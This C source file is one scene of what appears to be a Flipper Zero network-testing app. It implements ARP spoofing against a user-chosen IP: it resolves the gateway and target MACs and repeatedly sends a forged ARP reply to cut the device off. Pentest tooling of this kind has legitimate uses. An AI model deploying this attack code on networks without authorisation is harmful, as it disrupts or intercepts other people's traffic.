#include "../app_user.h"

#include "../app_user.h"

#if DEV_MODE

enum {
    VIEW_IP_LIST,
    SET_IP,
    ATTACK_IP
} arp_ip_specific_options;

// target_ip now lives in app->scan_params (F0.1)

/**
 * Scene for the menu to select some options in the arp spoofing to an specific IP
 */

void arp_spoofing_menu_to_ip_callback(void* context, uint32_t index) {
    App* app = (App*)context;

    switch(index) {
    case VIEW_IP_LIST:
        scene_manager_set_scene_state(
            app->scene_manager, app_scene_arp_scanner_option, ARP_STATE_SHOW_LIST);

        scene_manager_next_scene(app->scene_manager, app_scene_arp_scanner_option);
        break;

    case ATTACK_IP:
    case SET_IP:

        scene_manager_set_scene_state(
            app->scene_manager, app_scene_arp_spoofing_specific_ip_option, index);
        scene_manager_next_scene(app->scene_manager, app_scene_arp_spoofing_specific_ip_option);
        break;

    default:
        break;
    }
}

// Function for the menu arp spoofing scene on enter
void app_scene_arp_spoofing_specific_ip_menu_on_enter(void* context) {
    App* app = (App*)context;

    submenu_reset(app->submenu);

    // If an IP was selected from ARP, copy it
    if(*(uint32_t*)app->ip_helper != 0) {
        memcpy(app->scan_params.target_ip, app->ip_helper, 4);

        // Clear helper to avoid overwriting later
        memset(app->ip_helper, 0, 4);
    }

    if(*(uint32_t*)app->scan_params.target_ip == 0)
        memcpy(app->scan_params.target_ip, app->ip_gateway, 4);
    furi_string_reset(app->text);

    furi_string_printf(
        app->text,
        "Attack IP [%u.%u.%u.%u]",
        app->scan_params.target_ip[0],
        app->scan_params.target_ip[1],
        app->scan_params.target_ip[2],
        app->scan_params.target_ip[3]);

    submenu_set_header(app->submenu, "ARP Spoofing To IP");

    submenu_add_item(
        app->submenu, "View scanned IPs", VIEW_IP_LIST, arp_spoofing_menu_to_ip_callback, app);

    // Option set an IP by manual
    submenu_add_item(
        app->submenu, "Set IP manually", SET_IP, arp_spoofing_menu_to_ip_callback, app);

    // Option to run the ARP spoofing IP
    submenu_add_item(
        app->submenu,
        furi_string_get_cstr(app->text),
        ATTACK_IP,
        arp_spoofing_menu_to_ip_callback,
        app);

    uint32_t last_index = scene_manager_get_scene_state(
        app->scene_manager, app_scene_arp_spoofing_specific_ip_option);

    submenu_set_selected_item(app->submenu, last_index);

    // switch view to menu
    view_dispatcher_switch_to_view(app->view_dispatcher, SubmenuView);
}

// Function for the menu arp spoofing scene on event
bool app_scene_arp_spoofing_specific_ip_menu_on_event(void* context, SceneManagerEvent event) {
    bool consumed = false;
    App* app = (App*)context;
    UNUSED(app);
    UNUSED(event);
    return consumed;
}

// Function for the menu arp spoofing scene on exit
void app_scene_arp_spoofing_specific_ip_menu_on_exit(void* context) {
    App* app = (App*)context;

    UNUSED(app);
}

/**
 * Scene for the spoofing IP
 */

// Thread for worker
int32_t thread_for_spoofing_specific_ip(void* context);

// Callback to set the IP manually
void set_ip_to_spoof_manually(void* context) {
    App* app = (App*)context;
    scene_manager_previous_scene(app->scene_manager);
}

// to set the ip to spoof
void set_ip_to_spoof(App* app) {
    ip_assigner_reset(app->ip_assigner);
    ip_assigner_set_header(app->ip_assigner, "Set Ip Address to Spoof");
    ip_assigner_callback(app->ip_assigner, set_ip_to_spoof_manually, app);
    ip_assigner_set_ip_array(app->ip_assigner, app->scan_params.target_ip);

    view_dispatcher_switch_to_view(
        app->view_dispatcher, IpAssignerView); // Switch to the input byte view
}

// Set the spoofing and the scene and start the alternative thread
void spoofing_specific_ip(App* app) {
    // F0.4c — no thread_suspend; thread_for_spoofing_specific_ip uses
    // scanner_session for the target ARP resolve and pure TX after.

    // Start the other thread
    app->thread_alternative = furi_thread_alloc_ex(
        "ARP SPOOF SPECIFIC IP", 10 * 1024, thread_for_spoofing_specific_ip, app);
    furi_thread_start(app->thread_alternative);

    // Switch the view of the flipper
    widget_reset(app->widget);

    // switch to widget
    view_dispatcher_switch_to_view(app->view_dispatcher, WidgetView);
}

// When the thread is exit, resume the other thread
void finish_spoofing_specific_ip_thread(App* app) {
    furi_thread_join(app->thread_alternative);
    furi_thread_free(app->thread_alternative);
    // F0.4c — no thread_resume.
}

// Scene on enter for spoofing
void app_scene_arp_spoofing_specific_ip_on_enter(void* context) {
    App* app = (App*)context;

    switch(scene_manager_get_scene_state(
        app->scene_manager, app_scene_arp_spoofing_specific_ip_option)) {
    case ATTACK_IP:
        spoofing_specific_ip(app);
        break;

    case SET_IP:
        // Set the ip manually
        set_ip_to_spoof(app);
        break;

    default:
        break;
    }
}

// Function for the spoofing scene on event
bool app_scene_arp_spoofing_specific_ip_on_event(void* context, SceneManagerEvent event) {
    App* app = (App*)context;

    if(event.type == SceneManagerEventTypeBack) {
        scene_manager_previous_scene(app->scene_manager);
        return true;
    }

    return false;
}

// Function for the arp spoofing scene on exit
void app_scene_arp_spoofing_specific_ip_on_exit(void* context) {
    App* app = (App*)context;

    switch(scene_manager_get_scene_state(
        app->scene_manager, app_scene_arp_spoofing_specific_ip_option)) {
    case ATTACK_IP:
        finish_spoofing_specific_ip_thread(app);
        break;

    default:
        break;
    }
}

/**
 * Views or functions to show the IP address
 */
// Function to draw if getting the MAC from IP failed
void draw_process_failed(App* app) {
    widget_reset(app->widget);

    widget_add_string_multiline_element(
        app->widget, 64, 24, AlignCenter, AlignCenter, FontPrimary, "Failed getting MAC");

    widget_add_button_element(app->widget, GuiButtonTypeLeft, "Back", NULL, NULL);
}

// Function to display the view to attack an IP
void draw_ip_to_attack(App* app, uint8_t* ip) {
    widget_reset(app->widget);

    // Set the IP in the text
    furi_string_reset(app->text);
    furi_string_printf(app->text, "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);

    // Set the string element to display the IP address to attack
    widget_add_string_element(
        app->widget, 64, 5, AlignCenter, AlignCenter, FontPrimary, furi_string_get_cstr(app->text));

    // Display image
    widget_add_icon_element(app->widget, 46, 20, &I_device_to_attacked);

    // Add button element for view
    widget_add_button_element(app->widget, GuiButtonTypeCenter, "Attack", NULL, NULL);
}

// Function to display the view the IP attacked
void draw_ip_attacked(App* app, uint8_t* ip) {
    widget_reset(app->widget);

    // Set the IP in the text
    furi_string_reset(app->text);
    furi_string_printf(app->text, "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);

    // Set the string element to display the IP address to attack
    widget_add_string_element(
        app->widget, 64, 5, AlignCenter, AlignCenter, FontPrimary, furi_string_get_cstr(app->text));

    // Display image
    widget_add_icon_element(app->widget, 46, 20, &I_device_attacked);

    // Add button element for view
    widget_add_button_element(app->widget, GuiButtonTypeCenter, "Stop Attack", NULL, NULL);
}

/**
 * Thread for the arp spoofing specific IP
 */

int32_t thread_for_spoofing_specific_ip(void* context) {
    App* app = (App*)context;

    enc28j60_t* ethernet = app->ethernet;

    // frames to send
    uint8_t buffer_to_ip[MAX_FRAMELEN] = {0}; // Frame to send to the specific IP
    uint16_t size_one = 0;

    // Just the addreses for the specific device to disconnect
    uint8_t* ip_device_to_disconnect = app->scan_params.target_ip; // IP address
    uint8_t mac_device_to_disconnect[6] = {0}; // Mac address

    // Just an alternative to get the gateway IP
    // (This is unuseful, is not to get the real IP for the mac address ofour flipper)
    uint8_t ip_alternative[4] = {192, 168, 0, 1};
    uint8_t mac_alternative[6] = {1, 1, 1, 1, 1, 2};

    // Variable for time
    uint32_t time_out = 0;

    // Variable to start the attack or stop it
    bool attack = false;

    // Variable to control the attacks views
    bool display_once = true;

    // To know if the enc28j60 is connected
    bool start = app->enc28j60_connected;

    if(!start) {
        start = enc28j60_start(ethernet) != 0xff; // Start the enc28j60
        app->enc28j60_connected = start; // Update the connection status
    }

    bool program_loop = start; // This variable will help for the loop

    if(!is_the_network_connected(ethernet) && start) {
        draw_network_not_connected(app);
        program_loop = false;
    }

    if(!app->is_dora) {
        draw_dora_needed(app);
        program_loop = false;
    }

    // draw the waiting attack
    if(program_loop) {
        // then get mac gateway
        if(!arp_get_specific_mac(
               ethernet, ip_alternative, app->ip_gateway, mac_alternative, app->mac_gateway)) {
            draw_process_failed(app);
            //goto finalize_arp_spoofing_ip;
            program_loop = false;
        }

        // get the mac of the device
        if(!arp_get_specific_mac(
               ethernet,
               ethernet->ip_address, //ip_alternative,
               ip_device_to_disconnect,
               ethernet->mac_address, //mac_alternative,
               mac_device_to_disconnect)) {
            draw_process_failed(app);
            program_loop = false;
        }

        //2. Reply to the IP of the device
        arp_set_message_attack(
            buffer_to_ip,
            app->ip_gateway,
            app->mac_gateway, //mac_alternative,
            ip_device_to_disconnect,
            mac_device_to_disconnect,
            &size_one);
    }

    while(furi_hal_gpio_read(&gpio_button_back) && program_loop) {
        // Waiting to read the gpio ok to attack or stop to attack
        if(furi_hal_gpio_read(&gpio_button_ok)) {
            attack = !attack;

            display_once = true;

            furi_delay_ms(200);
        }

        if(display_once) {
            if(attack) draw_ip_attacked(app, ip_device_to_disconnect);
            if(!attack) draw_ip_to_attack(app, ip_device_to_disconnect);

            display_once = false;
        }

        // When the attacks start
        if(attack) {
            if((furi_get_tick() - time_out) > 200) {
                send_packet(ethernet, buffer_to_ip, size_one);
                time_out = furi_get_tick();
            }
        }

        furi_delay_ms(1);
    }

    return 0;
}

#endif
